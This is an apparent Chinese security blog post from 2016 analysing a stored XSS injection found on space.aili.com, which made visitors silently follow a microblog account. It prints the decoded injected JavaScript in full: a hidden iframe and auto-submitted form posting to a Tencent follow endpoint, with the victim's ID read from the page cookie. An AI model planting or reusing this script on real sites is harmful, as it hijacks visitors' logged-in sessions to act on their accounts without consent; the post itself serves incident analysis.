---
layout: post
title: "存储型XSS应用-微博刷粉"
date: 2016-08-03 11:34:13 +0800
comments: true
categories: security
---
目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果

被插入代码截图如下（每个页面都有，框架被修改）

![](http://jason5.cn/images/xss-weibo1.png)

被插入的恶意代码为：

![](http://jason5.cn/images/xss-weibo3.png)

解码后为:

![](http://jason5.cn/images/xss-weibo4.png)

格式化

```javascript
(function() {
    window.u = "chunxi_lu";
    window.mm = document.createElement("div");
    window.mm.innerHTML = "<iframe style='display:none' name='mj'></iframe><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'><input type='hidden' value='" + window.u + "' name='u'/><input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/></form>";
    document.body.appendChild(window.mm);
    document.getElementById("mi").submit();
})()
```

innerHTML被修改为

```javascript
<iframe style='display:none' name='mj'></iframe>
<form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'>
  <input type='hidden' value='" + window.u + "' name='u' />
  <input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' />
</form>
```

粉丝数刷到3w+

![](http://jason5.cn/images/xss-weibo2.png)
